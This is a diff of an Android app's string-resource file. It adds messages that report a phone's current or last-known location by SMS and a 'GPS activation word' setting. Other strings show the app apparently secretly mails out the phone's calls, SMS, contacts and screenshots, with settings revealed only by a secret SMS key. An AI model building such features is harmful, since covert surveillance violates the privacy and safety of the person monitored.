@@ -39,8 +39,10 @@
     <string name="mail_from">From</string>
     <string name="mail_body">Hi, this is an auto mail from %s with contacts, SMS and phone call information.</string>
     
-    <!-- GPS -->
-    <string name="gps_sms">Current position(latitude, longitude):%s, see it on maps.google.com</string>
+    <!-- Location -->
+    <string name="location_sms_real">Current location(latitude, longitude):%s, see it on maps.google.com</string>
+    <string name="location_sms_hist">Cannot get current location. The lastest historical location(latitude, longitude):%s, see it on maps.google.com</string>
+    <string name="location_sms_fail">Sorry, cannot get location now.</string>
     
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
@@ -80,7 +82,7 @@
     <string name="init_btn_hide">Exit</string>
     <string name="init_hint_getinfo">Get all phonecall, SMS, contact information of this mobile phone, and send them to mail box.</string>
     <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
-    <string name="init_hint_setting">Set mail address, interval, mobile phone number and sensitive words.</string>
+    <string name="init_hint_setting">Set mail address, interval, mobile phone number, sensitive words, GPS activation word.</string>
     <string name="init_hint_hide">Exit current setting dialog. This dialog can be triggered only by sending a SMS (the content is the key) to this mobile phone.</string>
     <string name="init_processing">Processing...</string>
     <string name="init_waiting">Please waiting...</string>
